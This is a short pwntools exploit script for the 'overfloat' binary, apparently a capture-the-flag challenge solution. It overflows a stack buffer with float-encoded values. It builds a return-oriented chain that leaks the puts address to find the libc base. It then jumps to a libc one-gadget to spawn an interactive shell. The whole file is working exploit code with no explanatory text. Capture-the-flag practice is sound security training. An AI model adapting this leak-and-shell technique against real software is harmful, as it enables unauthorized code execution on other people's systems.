'''
Author: Samrito
Date: 2022-01-25 15:01:20
LastEditors: Samrito
LastEditTime: 2022-01-27 21:19:13
'''
from pwn import *

io = process(argv=['./overfloat'])

libc = ELF('./libc-2.27.so')
elf = ELF('./overfloat')

pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    io.sendline(str(uf(p32(v1))))
    io.sendline(str(uf(p32(v2))))


#debug('b * chart_course')
for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

#leak base addr
main_addr = elf.symbols['main']
pop_rdi = 0x0400a83  # pop rdi; ret;
puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']

sendVal(pop_rdi)
sendVal(puts_got_addr)
sendVal(puts_plt_addr)
sendVal(main_addr)
io.sendline(b'done')

io.recvuntil(b'BON VOYAGE!\n')
res = io.recvline()
puts_addr = u64(res[:-1].ljust(8, b'\x00'))

base_addr = puts_addr - libc.symbols['puts']
gadget_libc_addr = 0x10a38c
gadget_addr = gadget_libc_addr + base_addr

for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

sendVal(gadget_addr)
io.sendline(b'done')

io.interactive()